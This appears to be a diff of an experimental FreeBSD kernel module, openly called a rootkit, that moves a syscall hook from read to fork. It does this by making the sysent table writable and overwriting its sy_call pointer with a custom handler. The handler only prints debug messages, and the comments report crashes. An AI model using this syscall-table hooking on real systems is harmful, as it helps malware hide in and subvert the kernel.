@@ -24,19 +24,19 @@
 // };
 
 
-// This is a pointer to sysread in memory, See 3.
-static struct sysent *original_sysread;
+// This is a pointer to sysfork in memory, See 3.
+static struct sysent *original_sysfork;
 
 
 
 // All.
 // New
-// Handlers
+// Hand
 // Go
 // Here
 
 // we could also implement a switch statement here as opposed to if's and else if's for what invoked the syscall
-static int custom_sysread(struct thread *td, void *syscall_args) {
+static int custom_sysfork(struct thread *td, void *syscall_args) {
 
 
     uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
@@ -60,17 +60,17 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
     uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
     uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
     // value returned by og sys_read indicating success or if an error occured
-    int original_sysread_return;
-    // invoke og syscall
-    // original_sysread is pointer to the struct sys_read
+    int original_sysfork_return;
+    // invoke og syscall 
+    // original_sysfork is pointer to the struct sys_fork
     // sy_call is a member of that struct
     // ->, is accessing the member and invoking it
-    original_sysread_return = original_sysread->sy_call(td, syscall_args);
+    original_sysfork_return = original_sysfork->sy_call(td, syscall_args);
 
     // check if an error occured
-    if (original_sysread_return != 0) {
-        uprintf("Original SYS_read returned error: %d\n", original_sysread_return);
-        return original_sysread_return;
+    if (original_sysfork_return != 0) {
+        uprintf("Original SYS_fork returned error: %d\n", original_sysfork_return);
+        return original_sysfork_return;
     }
 
     // see what process invoked it
@@ -79,7 +79,7 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
     uprintf("HOLY SHIT IT'S WORKING!!!!!!!!!!\n");
     // if something else invoked it
     // else, return error;
-    return original_sysread_return;
+    return original_sysfork_return;
 
     // do some functionality before the wrapper collects the response from CPU registers 
 
@@ -100,15 +100,15 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
 
 
 // Find the memory address of the sysent table and point to our handlers if found.
-static int find_sysread_address (void) {
+static int find_sysfork_address (void) {
 
     // Store memory address of sysent table, See 4.
 
-    original_sysread = &sysent[SYS_read];
+    original_sysfork = &sysent[SYS_fork];
 
     // see if we can point to our custom handler
-    if (original_sysread->sy_call) {
-        uprintf("Sysread found at address: %p\n", original_sysread->sy_call);
+    if (original_sysfork->sy_call) {
+        uprintf("Sysfork found at address: %p\n", original_sysfork->sy_call);
         // point to custom handler, with synchronization to avoid unwanted kernel behaiver
         // critical_enter();  // Enter critical section
 
@@ -132,7 +132,7 @@ static int find_sysread_address (void) {
         // this line is causing everything to crash!!!
 
         // make sysent memory address writable
-        vm_offset_t addr = (vm_offset_t)&sysent[SYS_read];  // Get the address of sysent[SYS_read]
+        vm_offset_t addr = (vm_offset_t)&sysent[SYS_fork];  // Get the address of sysent[SYS_fork]
 
         pmap_protect(kernel_pmap,                        // Kernel's page map
                  trunc_page(addr),                   // Align to the start of the page
@@ -140,7 +140,7 @@ static int find_sysread_address (void) {
                  VM_PROT_READ | VM_PROT_WRITE);
 
         // change sysent sy_call pointer to our point to our custom handler
-        sysent[SYS_read].sy_call = (sy_call_t *)custom_sysread; 
+        sysent[SYS_fork].sy_call = (sy_call_t *)custom_sysfork;
 
         // set back to read only
         pmap_protect(kernel_pmap,                        // Kernel's page map
@@ -155,7 +155,7 @@ static int find_sysread_address (void) {
         return 0;
     }
     else {
-        uprintf("sysread not found.\n");
+        uprintf("sysfork not found.\n");
         return 1;
     }
 }
@@ -170,7 +170,7 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     switch (event) {
     case MOD_LOAD:
 
-        search_table_case = find_sysread_address();
+        search_table_case = find_sysfork_address();
         if (search_table_case == 0) {
             uprintf("No error with finding sysent table address.\n");
         }
